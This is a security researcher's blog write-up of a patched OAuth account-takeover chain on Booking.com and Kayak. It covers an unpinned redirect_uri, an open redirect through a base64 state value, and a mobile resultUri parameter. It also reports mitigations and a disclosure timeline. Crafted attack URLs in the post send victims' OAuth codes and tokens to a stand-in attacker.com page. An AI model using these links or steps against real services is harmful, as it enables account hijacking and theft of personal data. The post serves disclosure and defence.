---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-02_traveling-with-oauth-account-takeover-on-bookingcom.md
original_filename: 2023-03-02_traveling-with-oauth-account-takeover-on-bookingcom.md
title: Traveling with OAuth - Account Takeover on Booking.com
category: documents
detected_topics:
- oauth
- mobile-security
- sso
- access-control
- command-injection
- otp
tags:
- imported
- documents
- oauth
- mobile-security
- sso
- access-control
- command-injection
- otp
language: en
raw_sha256: 109d0fd398edd9c5b9da243974e3fb1b4ee0ddffd5fe83626e211aa02b486547
text_sha256: 25fce135ff9a1602b75bf5d057a5a2fc13e16f175eb86f0a508b5bf79e5d68a2
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: true
---

# Traveling with OAuth - Account Takeover on Booking.com

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-02_traveling-with-oauth-account-takeover-on-bookingcom.md
- Source Type: markdown
- Detected Topics: oauth, mobile-security, sso, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: True
- Raw SHA256: `109d0fd398edd9c5b9da243974e3fb1b4ee0ddffd5fe83626e211aa02b486547`
- Text SHA256: `25fce135ff9a1602b75bf5d057a5a2fc13e16f175eb86f0a508b5bf79e5d68a2`


## Content

---
title: "Traveling with OAuth - Account Takeover on Booking.com"
page_title: "OAuth Account Takeover - Account Takeover on Booking.com"
url: "https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com"
final_url: "https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com"
authors: ["Aviad Carmel (@AviadCarmel)"]
programs: ["Booking.com", "KAYAK"]
bugs: ["OAuth", "Account takeover", "Authentication bypass", "Open redirect"]
publication_date: "2023-03-02"
added_date: "2023-03-03"
source: "pentester.land/writeups.json"
original_index: 1443
---

Salt Labs

# Traveling with OAuth — Account Takeover on Booking.com

March 2, 2023

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/68154675c8fd52cf04d62775_AviadCarmel.avif)[Aviad Carmel](/blog-authors/aviad-carmel)

Security Researcher

[OAuth](/blog/a-new-oauth-vulnerability-that-may-impact-hundreds-of-online-services) (Open Authorization) is a modern, open authorization standard designed to allow cross-application access delegation — for example, allowing your application to read data from your Facebook profile. Combined with the proper extensions, OAuth can also be used for authentication — for example, to log into your application using Google credentials.

Since its first introduction in 2006, OAuth has gained tremendous popularity. Recent studies show that about 90% of the users preferred social login over traditional email registration on websites. Given the widespread usage of OAuth, any vulnerabilities found in its components or their implementations may lead to considerable security impact in the applications and services using them.

OAuth-based account takeover is a classic API attack method; [**this eBook covers how API attacks work and why they evade traditional tools**](https://content.salt.security/understanding-api-attacks-ebook)**.**

This post is the first in a series intending to describe these issues in depth, with rich technical details, and to share real-world use cases highlighting these errors and their potential impact. For this initial post, we describe an [OAuth implementation issue Salt Labs researchers were able to find in Booking.com](https://salt.security/press-releases/salt-security-uncovers-api-security-flaws-within-booking-com-that-allowed-full-account-takeover-issues-have-been-remediated?), a company with $16 billion in annual revenue.

For the OAuth issues we found, had a bad actor discovered and successfully exploited them, that attacker could have taken over the accounts of users logging in via Facebook. Once logged in, the attacker could have performed any action on behalf of the compromised users and gain full visibility into the account, including all of a user’s personal information. Our research found that attackers could then use the compromised booking.com login to also log into sister company Kayak.com.

All the issues described in this post have been disclosed to Booking.com, and the company acted very quickly to address and completely mitigate them. We want to use this opportunity to thank Booking.com for its professional approach and cooperation with Salt Labs in this matter. Booking.com provided this commentary:

> "On receipt of the report from Salt Security, our teams immediately investigated the findings and established that there had been no compromise to the Booking.com platform, and the vulnerability was swiftly resolved. We take the protection of customer data extremely seriously. Not only do we handle all personal data in line with the highest international standards, but we are continuously innovating our processes and systems to ensure optimal security on our platform, while evaluating and enhancing the robust security measures we already have in place. As part of this commitment, we welcome collaboration with the global security community, and our [Bug Bounty Program](https://hackerone.com/bookingcom) should be utilized in these instances."

The following short video provides a visual overview of how the Salt Labs researchers were able to hijack the OAuth login process.

Let’s dive into the details.

## What is OAuth?

OAuth 2.0 is a commonly used framework that allows users to authorize third-party applications to access their resources without sharing their passwords. For example, you can authorize Slack to access your Google calendar so your colleagues can see when you’re in meetings.

OAuth was not originally intended to be an authentication framework, but it has emerged as a widely used authentication mechanism for users with the social sign-in feature — the “log in with Google/Facebook” option you see on sites and in applications. Many ecommerce websites and apps use OAuth, for example, to allow users to authenticate their account and make purchases without having to enter their credentials multiple times.

You may have heard of “OpenID connect” for authentication — it’s a similar concept and based on OAuth.

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd20a40a7a82865b3e9135_1.png)

A security breach in OAuth can lead to identity theft, financial fraud, and access to all sorts of personal information including credit card numbers, private messages, health records, and more. Last year, many interesting blogs described account takeover in sign-in OAuth flows, such as [Frans Rosen's "Dirty Dancing"](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/) and [Youssef Sammouda's blog](https://ysamm.com/?p=763), the findings of which netted him a $44,625 award from Facebook. These blogs and others provide valuable insights into the inner workings of OAuth and the potential risks associated with it.

## How does OAuth work for authentication?

Let's start with a simple non-technical diagram:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6400a41da34e592e37fa89a3_1.png)

Let’s explain the steps, one by one:

1\. You enter _Randomsite.com_ and click on “Login with Facebook”. 

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd21b843e6880b7806642e_3.png)

2\. _Randomsite.com_ will open a new window to Facebook. 

3\. If it's your first time on _Randomsite.com_ , Facebook will ask you to give permission. Otherwise Facebook will automatically authenticate you.

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd221f0a7a828282400f1a_4.png)

4\. After you click on “Continue as John”, Facebook will generate a secret token. This token is private for _Randomsite.com_ , and associated with your Facebook profile.

5\. Facebook redirects you back to _Randomsite.com_ with this token. 

6\. _Randomsite.com_ uses the token to talk directly with Facebook to get your email address. 

7\. Facebook approves that this is really john@gmail.com, and _Randomsite.com_ can log him in.

And now let’s dive into more details, by adding URLs to the diagram:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6400a42bdd101731edd18d10_2.png)

### In steps 2-3:

_After John clicks on login with Facebook, Randomsite.com_ opens a new window to the following address:

_https://www.facebook.com/v3.0/dialog/oauth?_**_redirect_uri=https://randomsite.com/OAuth_** _& scope=email&client_id=1501&state=[random_value]&response_type=token_.

Note the redirect_uri parameter – it tells Facebook where to send the token in Step 4-5.

### In steps 4-5:

Facebook prepares a secret token for _Randomsite.com_ (the client_id parameter tells facebook that the request is from randomsite.com) and redirects your browser back to redirect_uri . The exact redirection:

_https://randomsite.com/OAuth#token=[secret_token]] &state=[Random_Value]_

### In steps 6-7:

_Randomsite.com_ reads the token from the URL, and uses it to talk directly with Facebook using the following API:

_https://graph.facebook.com/me?fields=id,name,email &access_token=[secret_token]_.

The response is john@gmail.com.

The flow in the example is called “implicit grant type,” which is common in single-page applications and native desktop applications that don't have a back end. Although I could use an example without a back end (without Randomsite.com), I decided to combine an implicit grant type with a back end because it is easier to understand.

Google, Apple, and other well-known vendors follow a similar flow. A newer method takes advantage of the PostMessage feature instead of a redirection, but we’re not addressing that use case in this post. Using redirection is still the most common approach.

## OAuth implementation at Booking.com 

### Why Booking.com

Booking.com, part of Booking Holdings, a Fortune 500 company, is one of the most popular and widely used hotel booking platforms. The company has more than 15,000 employees and enjoys $16B in annual revenue.

As a happy customer of [Booking.com](http://Booking.com), I have used the platform many times to book vacations. As a security researcher, I wanted to take a look at the OAuth implementation before an ill-intentioned hacker does.

### How OAuth works in Booking.com

The flow is very similar to the example with Randomsite.com except it includes one new step, which we marked in red:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6400a439dd10174811d1a0b1_3.png)

Step 1: In _Booking.com_ , you click on “Login with Facebook.”

### Steps 2-3:**** ‍

Booking opens the following link: _https://www.facebook.com/v3.0/dialog/oauth?_**_redirect_uri=https://account.booking.com/social/result/facebook_** _& scope=email&client_id=210068525731476&state=[large_object]&_**_response_type=code_**.

Note that the response type is code instead of a token as we saw in the example of Randomsite.com.

A code is a temporary value that should be exchanged with a token. It adds an additional layer of security as I will explain in steps 6-7.

### Steps 4-5:****

Facebook authenticates you and redirects you back to booking.com with a **code**. 

_https://account.booking.com/social/result/facebook?code={code} &state=[large_object]_

Note that the code was passed to account.booking.com in a query parameter (**?** code=) instead of hash fragment (**#** token=) like the example of Randomsite.com. We will explain more on this issue later.

### Steps 6-7: 

To get a token, booking.com needs to exchange the code with token using the following Facebook API:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd248cd45f70aace3a7385_8.png)

(from official [Facebook documentation](https://developers.facebook.com/docs/facebook-login/guides/advanced/manual-flow))

This step can be done only by Booking.com because it involves an {app-secret} only Booking.com knows. The code is for one-time use – that is, it can be exchanged only once. This approach is more secure – if an attacker steals the code, it is almost impossible to exploit.

### Steps 8-9: 

Like we saw in Randomsite.com, Booking.com uses the Facebook API to get information about you, such as your email address. If Booking.com has an account that uses this email, then Booking signs you into this existing account. 

This flow, which is common in almost every modern site, is called “Authorization code grant” or “OAuth explicit flow.”

## Account takeover on Booking.com

In OAuth, the goal of the attacker is to steal the token or code of the victim. In the case of Booking, the focus is the code. My general methodology in OAuth research is to cause unexpected behaviors of the flow by changing every parameter I can, to see how these manipulations advance me toward the ability to launch a successful attack.

I was able to chain together three different security issues, which I will explain in detail, to enable full account takeover at Booking.com. 

### Security gap 1 — not allowing a unique path

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6400a4456796a6cbb13cf351_4.png)

By manipulating a few of the steps in the OAuth sequence for this site, I was able to learn helpful information and start a path of manipulation.

In normal behavior, like I explained before, when a user clicks on “log in with Facebook,” Booking redirects the user to the following link in Facebook: _https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/ social/result/facebook&scope=email&client_id=210068525731476&state=[large_object]&response_type=code_.

In step 1, I changed the redirect_uri to a different path and sent this link to a victim:

_https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/ any/path/an/attacker/wants&scope=email&client_id=210068525731476&state=[large_object]&response_type=code_.

Note that we can’t change the origin (**account.booking.com**) because Facebook will throw an error - it doesn’t match the predefined origin provided by Booking.com. 

When Booking.com registered to Facebook, they provided a predefined origin for the redirect_uri, but didn’t provide an exact path. Therefore Facebook can validate only the origin before the redirection occurs. 

Step 4: This link will redirect the victim to:

_https://account.booking.com/ any/path/an/attacker/wants?code=[secret_code]?state=[large_object]_

‍

**We can send the code to any path we want** , so now we look for a way to send the code to another origin/domain that we control.

### Security gap 2 — open redirection

At this point, I needed a path in booking.com that would redirect the victim to my controlled domain. That’s the definition of an open redirection vulnerability.

I start exploring features in Booking.com, and I find an interesting thing in “My Dashboard”:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd260f56c1f132fcab55e8_10.png)

Clicking on “add a display name”, points to the following url:

_https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=_**_eyJteXNldHRpbmdzX3BhdGgiOiIvbXlzZXR0aW5ncy9wZXJzb25hbCIsImFpZCI6IjEyMyJ9_**

That URL automatically redirects the user to: _https://account.booking.com/mysettings/personal_. Can you guess how? 

I immediately notice that the **_state_** variable contains a base64 json string: **eyJteXNldHRpbmdzX3BhdGgiOiIvbXlzZXR0aW5ncy9wZXJzb25hbCIsImFpZCI6IjEyMyJ9**.

Let’s decode it:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd283a9443136bc24bf870_11.png)

Seems like Booking uses the mysettings_path to determine how to redirect the user.

Let’s encode the following Json:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd2863288ad80ffe966de7_12.png)

We got eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2***REDACTED-SUSPECT-TOKEN***We replace the state in the original link, and send the victim the new link:

_https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state= eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ_

The link automatically redirects the victim to a shorter link (I skipped it before): 

_https://account.booking.com/settings/oauth_callback?state= eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&code=not_important_123_

And then to:

**_https://attacker.com/index.php_**

You might have seen the word “OAuth” or “redirect_uri” in the open-redirection link. I assume it’s an inner implementation of OAuth in Booking.com. It isn't related to Facebook or to the redirect_uri from security gap 1.

**Now we have an open redirection bug in booking.com.**

## Security gap 1 + 2 = Account Takeover Attempt

The link to Facebook from security gap 1 (where we can send the code to any path we want):

_https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/_**_any/path/we/want_** _& scope=email&client_id=210068525731476&state=large_object]&response_type=code_

**+**

The open redirection link from security gap 2 (redirection to _www.attacker.com_) is:

**_https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ_**

**=**

Let’s insert the open redirection link in the redirect_uri from security gap 1:

_https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=_**_https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ_** _& scope=email&response_type=code&client_id=210068525731476_

We send this link to the victim.

##### Changing the response type

If the victim clicks on the link as it, Facebook redirects the user to the URL from security gap 2, with a code:

_https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ &code=[secret_code]_

It’s the URL with the open redirection (the state eyJteXN… points to attacker.com), so Booking redirects the victim to: _https://attacker.com/index.php_.

**However, in a redirection, only the values after ‘#’ (hash fragments) are passed by the browser.** The code, which was passed in a query parameter (?=code=), was not sent to attacker.com (does not appear in the redirection to https://attacker.com/index.php). 

By changing the response type from “code” to “code, token”. Facebook will send both the code and the token in the **hash fragment**. It’s a feature :)

The reason: since an access token is a super sensitive value in OAuth, using the hash fragment is a more secure approach. It is not sent to the server side and doesn't appear in the logs – only the javascript code can read it. (For more information on this detail, you can Google “OAuth implicit grant.”)

## Flow summary: 

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6400a45745e2aef9efbc0dfb_5.png)

Step 1: The attacker sends the victim the following link:

_https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ &scope=email&response_type=code,token&client_id=210068525731476_

Steps 2 and 3: After the victim clicks on the new link (with response type=code,token), Facebook **automatically** redirects the user to the URL from security gap 2 with a code in the **hash fragment** :

_https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ #code=[secret_code]&access_token=[token]_

Steps 4 and 5: It’s the URL with the open redirection (the state points to attacker.com), so Booking redirects the victim to: _https://attacker.com/index.php_

Step 6: The browser add the code to the hash fragment, and redirects the victim to:

_https://attacker.com/index.php #code=[secret_code]&access_token=[token]_

### Optional: Let see the source code of attacker.com/index.php:

**Index.php** — a javascript code that reads the url and sends it to save.php.

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd2a6d9f5c4e6f11f2d412_14.png)

**Save.php** — save the inputs to a log file.

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd2a76848a5945e469bc4b_15.png)

(I generated the code with sanppify.com)

## Account takeover Attempt 1

At this point, we have the code of the victim. We (as the attacker) need to start a new login flow and replace our code with the victim code. We click again “sign-in with Facebook” and sign in using our account.

In the normal flow, after Facebook authenticate us, it redirects us to Booking with our code:

_https://account.booking.com/social/result/facebook?code={our_code}&state=[large_object]_

**We intercept this request.** We replace the code with the victim stolen code:

_https://account.booking.com/social/result/facebook?code={victim_code}&state=[large_object]_

Booking.com should exchange the code for a token, and get the profile info of the victim.

What comes back? Wait for it …

“Invalid code”

Nothing happens. What did I miss?

## Debugging the account takeover failure — what did we miss?

From Facebook documentation, to exchange code with a token, Booking.com, in the back end, should use this API:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd571e7a81cf6e69bbfead_16.png)

_In the documentation, Facebook wrote “This argument (redirect_uri) must be the same as the_** _original_** _that you used when starting the OAuth login process”._

We started the OAuth login process with this link:

_https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=_**_eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ_** _& scope=email&response_type=token,code&client_id=210068525731476_

In this case, the **original** redirect_uri is marked in purple.This link is the open redirection link from security gap 2.

However, in the back end, when Booking exchanges the code for a token using the _/oauth/access_token_ API, it sends Facebook the hard-coded value “ _https://account.booking.com/social/result/facebook_ ” as the redirect_uri. This is the redirect_uri that booking uses in the normal flow.

In the same OAuth flow, Facebook got two different redirect_uri, got suspicious, and therefore threw an error.

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd57ade48b2532eb1d34cf_17.png)

## Finding security gap 3

At this point, I couldn’t find a solution on the web, so I decided to do some research on the mobile application of Booking.com. I used Android studio, Frida (to bypass SSL pinning) and a decompiler to read the code responsible for OAuth on that app.

For intercepting the request between the mobile application and Booking.com backend, I used Burp.

The diagram of exchanges on the mobile app is a little confusing – you can focus just on Step 6:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd57da007a93428ffeeae6_18.png)

The OAuth flow in the mobile app has one major difference from the flow on the website – Step 6.

Steps 3 to 6: The code was passed to the mobile application, and then the mobile Application sent it to Booking.com. To be more accurate, the code was passed to Chrome->Booking.com->MobileApp->Booking.com

I’m not sure why this ping-pong is necessary. 

Step 6: The mobile app passes the code to Booking.com using a post request: 

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd582a64e9fab78f869171_19.png)

**Pay attention to resultUri. Can you guess what Booking does with it?**

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd5851985f4a6e63d11841_20.png)

If Booking.com uses resultURi as the redirect_uri to exchange code with token, and we can control this value, then we can bypass the validation of Facebook.

The original redirect_uri that we used for the attack is:

_https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=_**_eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ_**

To summarize, as the attacker, we need to:

  1. Login to Booking.com, from the attacker Mobile application, with the attacker account.
  2. Intercept the request in Step 6.
  3. Replace our code with the stolen victim code.
  4. Replace resultURi, with the link that we used for the attack (booking.com/state=eyJteXn..)

We send that request to Booking.com, and … **game over. We can log into the victim account.**

(In the video, the attacker uses Mac for the attack, the victim uses Windows.)

(Note: In security gap 2, I had two links that caused a redirection. In the video, I used the shorter link.)

## What’s next? 

We created a link that takes over any account on Booking.com that uses Facebook. The link itself points to a legitimate [facebook.com](http://facebook.com) or [booking.com](http://booking.com) domain, which makes it difficult to detect (manually or automatically). The next step is to check the impact on other Booking sites such as Kayak.com and on other sign-in methods such as Google.

### Account takeover on Kayak.com

It's a feature. If we have access to the victim account on Booking.com, we should also have access to kayak.com, which lets the users identify themselves using their account in Booking.com. We tested this theory, and it worked.

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63fd58f97ccfdebd5c8b6088_21.png)

### Logging in with Google

The vulnerability is in the integration between Facebook and Booking.com, However, it’s possible to sign in to a Booking.com account using Facebook even if that account was created using Google or another sign-in method.

To check it, we sent a link to a **user that was authenticated with Google**. During the exploit, Facebook asked (very legitimately, the victim has no reason to suspect) to allow access to Booking.com, and then the code was passed to our domain. Since the victim code is associated with the victim email address, Booking.com reads the email address from the code (/token) and connects the user to the relevant account that has this email.

### Potential Business Impact

This misconfiguration of OAuth has a significant impact on both the company and its customers. An attacker could potentially make unauthorized requests on behalf of a victim, cancel existing reservations, or access sensitive personal information such as booking history, personal preferences, and future reservations. The site also supports the ability to rent cars or order taxis.

### How to mitigate this threat:

The vulnerability described in this document is a combination of three minor security gaps. Most of the focus is on the first security gap, which allows the attacker to choose another path for the redirect_uri.

When you do an integration with Facebook or another vendor, it’s **extremely important to provide hard-coded paths** for the redirect_uri in the Facebook configuration. As you saw in the document, only origin is not enough.

Security Gap 3 is also related to redirect_uri. This value should not be taken from the user input.

### Booking.com — A Fast Fix

Security vulnerabilities can happen in any website, and the response is what matters. We reported everything to Booking.com, and the team was able to fix these security gaps very quickly. We were happy with Booking.com's commitment to security and the company’s willingness to take swift action to protect the personal information of its users. By fixing the issue, Booking.com may have prevented a security breach at the hands of ill-intentioned hackers.

To learn more about how Salt can help defend your organization from API risks, you can [connect with a rep](https://salt.security/contact-us) or[ schedule a personalized demo](https://content.salt.security/demo.html).

### Disclosure Timeline

We worked through the following timeline in this coordinated disclosure process. Again, we thank Booking.com for taking action so quickly to resolve these critical vulnerabilities.

  * Salt Labs discovers security gaps 1# and 2#: November 10, 2022
  * Salt Labs discovers all security gaps with account takeover: November 21, 2022
  * Salt Labs makes the first contact with Booking.com: November 27, 2022
  * Salt Labs discloses technical details to Booking.com security team: December 4, 2022
  * Salt Labs confirms exploits are no longer working and security gaps have been resolved: December 26, 2022
  * Booking.com security team confirms the security disclosure, that the team has fixed the issues, and that the team has validated the issues were properly fixed: January 12, 2023
  * Salt Security marketing team shares press release and blog writeup with Booking.com media team: February 19, 2023
  * Booking.com sends formal commentary to be included in vulnerability research blog: February 24, 2023

## 

## Tags

[Salt Labs](/blog-tags/salt-labs)

[API Vulnerability Analysis](/blog-tags/api-vulnerability-analysis)

[Research](/blog-tags/research)

## Categories

[Customer](/blog-categories/customer)

[Product](/blog-categories/product)

[Industry](/blog-categories/industry)

[Technical](/blog-categories/technical)

[Company](/blog-categories/company)

[Salt Labs](/blog-categories/salt-labs)

## Salt Security Blog

Sign up for the Salt Newsletter for the latest resources and blog posts.

## Our latest posts

[IndustryWe Trained Cybersecurity Startups to Win POVs, Not Solve ProblemsRoey Eliyahu | June 22, 2026If agents are connected to APIs, attackers can use them to explore and exploit weak authorization paths faster. The API vulnerability was already serious. Agentic access makes it scalable.Read more](/blog/we-trained-cybersecurity-startups-to-win-povs-not-solve-problems)

[IndustryDeconstructing the Agentic Stack: Why API Visibility Is the Ultimate Defense for AI AgentsRoy Bar Yosef | June 11, 2026Organizations are rushing to deploy AI agents, but many still lack a clear view of what those agents can access, which tools they can call, and which APIs they can trigger.Read more](/blog/deconstructing-the-agentic-stack-why-api-visibility-is-the-ultimate-defense-for-ai-agents)

[IndustryEveryone Is Buying AI Guardrails. But Agents Have the Keys to the Car.Roey Eliyahu | June 8, 2026The first wave of AI security was necessary. It gave us guardrails for prompts, models, and outputs. But agents changed the security question.Read more](/blog/everyone-is-buying-ai-guardrails-but-agents-have-the-keys-to-the-car)
